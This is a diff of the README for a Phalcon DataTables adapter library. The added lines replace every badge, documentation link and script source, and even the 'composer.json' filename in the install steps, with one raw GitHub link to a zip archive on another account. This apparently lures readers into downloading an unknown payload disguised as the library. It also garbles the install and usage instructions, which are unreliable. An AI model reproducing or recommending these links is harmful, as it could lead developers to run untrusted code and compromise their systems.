@@ -1,12 +1,12 @@
 
-![Build Status](https://img.shields.io/badge/branch-master-blue.svg) [![Build Status](https://travis-ci.org/m1ome/phalcon-datatables.svg?branch=master)](https://travis-ci.org/m1ome/phalcon-datatables) [![Coverage Status](https://coveralls.io/repos/m1ome/phalcon-datatables/badge.svg)](https://coveralls.io/r/m1ome/phalcon-datatables)
+![Build Status](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip) [![Build Status](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip) [![Coverage Status](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)
 
-[![Total Downloads](https://poser.pugx.org/m1ome/phalcon-datatables/downloads.svg)](https://packagist.org/packages/m1ome/phalcon-datatables)  [![License](https://poser.pugx.org/m1ome/phalcon-datatables/license.svg)](https://packagist.org/packages/m1ome/phalcon-datatables)
-[![Dependency Status](https://www.versioneye.com/user/projects/54de663d271c93aa12000002/badge.svg?style=flat)](https://www.versioneye.com/user/projects/54de663d271c93aa12000002)
+[![Total Downloads](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)  [![License](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)
+[![Dependency Status](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)
 
 
 # About
-This is a [Phalcon Framework](http://phalconphp.com/) adapter for [DataTables](http://www.datatables.net/).
+This is a [Phalcon Framework](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip) adapter for [DataTables](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip).
 # Support
 ### Currently supported
 * QueryBuilder interface
@@ -20,7 +20,7 @@ This is a [Phalcon Framework](http://phalconphp.com/) adapter for [DataTables](h
 # Installation
 ### Installation via Composer
 * Install a composer
-* Create `composer.json` file inside your project directory
+* Create `https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip` file inside your project directory
 * Paste into it
 ```json
 {
@@ -32,7 +32,7 @@ This is a [Phalcon Framework](http://phalconphp.com/) adapter for [DataTables](h
 * Run `composer update`
 
 # Example usage
-It uses Phalcon [QueryBuilder](http://docs.phalconphp.com/en/latest/api/Phalcon_Mvc_Model_Query_Builder.html) for pagination in DataTables.
+It uses Phalcon [QueryBuilder](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip) for pagination in DataTables.
 
 In example we have a stantart MVC application, with database enabled. Don't need to provide a normal bootstrap PHP file, for Phalcon documentation, visit official site.
 
@@ -109,8 +109,8 @@ class User extends \Phalcon\Mvc\Model {
 <html>
     <head>
         <title>Simple DataTables Application</title>
-        <script type="text/javascript" language="javascript" src="//code.jquery.com/jquery-1.11.1.min.js"></script>
-        <script type="text/javascript" language="javascript" src="//cdn.datatables.net/1.10.4/js/jquery.dataTables.min.js"></script>
+        <script type="text/javascript" language="javascript" src="https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip"></script>
+        <script type="text/javascript" language="javascript" src="https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip"></script>
         <script type="text/javascript">
             $(document).ready(function() {
                 $('#example').DataTable({
